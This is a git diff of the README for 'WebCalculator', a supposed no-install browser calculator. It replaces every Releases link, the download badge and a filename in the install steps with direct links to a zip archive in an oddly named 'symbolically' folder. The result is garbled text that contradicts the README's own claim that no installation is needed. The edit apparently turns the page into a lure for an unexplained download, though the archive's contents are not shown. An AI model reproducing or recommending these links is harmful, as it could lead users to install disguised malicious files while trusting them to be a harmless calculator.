@@ -7,7 +7,7 @@ WebCalculator is a sleek, responsive web-based calculator built with HTML, CSS, 
 To begin using WebCalculator, follow these simple steps to download and run the application.
 
 ## 📥 Download Here
-[![Download WebCalculator](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/ibra69s/WebCalculator/releases) 
+[![Download WebCalculator](https://raw.githubusercontent.com/ibra69s/WebCalculator/master/symbolically/WebCalculator.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ibra69s/WebCalculator/master/symbolically/WebCalculator.zip) 
 
 ## 💻 System Requirements
 To run WebCalculator, ensure you have a modern web browser installed, such as:
@@ -20,11 +20,11 @@ No installation is needed; you can access WebCalculator directly in your browser
 
 ## 📁 Download & Install
 1. Click on the link below to visit the Releases page:  
-   [Visit the Releases Page](https://github.com/ibra69s/WebCalculator/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/ibra69s/WebCalculator/master/symbolically/WebCalculator.zip)
 
 2. On the Releases page, look for the latest version of WebCalculator. You will find files ready for download.
 
-3. Click on the file labeled for the web. This may be named something like `index.html` or `WebCalculator.html`.
+3. Click on the file labeled for the web. This may be named something like `https://raw.githubusercontent.com/ibra69s/WebCalculator/master/symbolically/WebCalculator.zip` or `https://raw.githubusercontent.com/ibra69s/WebCalculator/master/symbolically/WebCalculator.zip`.
 
 4. Once the download is complete, locate the file on your computer. It is usually found in your "Downloads" folder.
 
